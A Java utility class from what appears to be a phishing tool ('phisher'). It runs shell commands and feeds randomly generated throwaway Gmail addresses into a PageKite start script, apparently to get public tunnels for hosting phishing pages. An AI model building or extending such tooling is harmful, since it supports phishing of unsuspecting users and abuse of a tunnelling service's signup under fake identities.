package com.shaw.phisher.utils;

import org.springframework.beans.factory.annotation.Value;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;
import java.util.Random;

public class Command {
    @Value("pageKite.email")
    public String pageKiteEmail;

    public static String inputFilePath = System.getProperty("user.home") + "/.phisher/.config";
    public static String pageKiteFilePath = System.getProperty("user.home") + "/.phisher/start.sh";
    public static Process execute(String command) throws IOException {
        return Runtime.getRuntime().exec(new String[]{command});
    }

    public static String getRandom30(){
        StringBuilder random30 = new StringBuilder();
        Random random = new Random();
        for(int i=0;i<30;i++){
            random30.append(random.nextInt(10));
        }
        System.out.println(random30.toString());
        return random30.toString();
    }
    public static void executePageKite() {
        Operations.writeFile(inputFilePath, "\n"+getRandom30()+"@gmail.com"+"\n\n"+"n\n\n");
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(pageKiteFilePath);
           processBuilder.redirectInput(new File(inputFilePath));
           processBuilder.redirectOutput(ProcessBuilder.Redirect.INHERIT);

            Process process = processBuilder.start();

//            process.waitFor();
//            BufferedReader buf = new BufferedReader(new InputStreamReader(process.getInputStream()));
//            String line = "";
//            StringBuilder output = new StringBuilder();
//
//            while ((line = buf.readLine()) != null) {
//                output.append(line).append("\n");
//            }
//
//            System.out.println(output);
        }catch (Exception e){
            System.out.println(e);
        }
    }
}
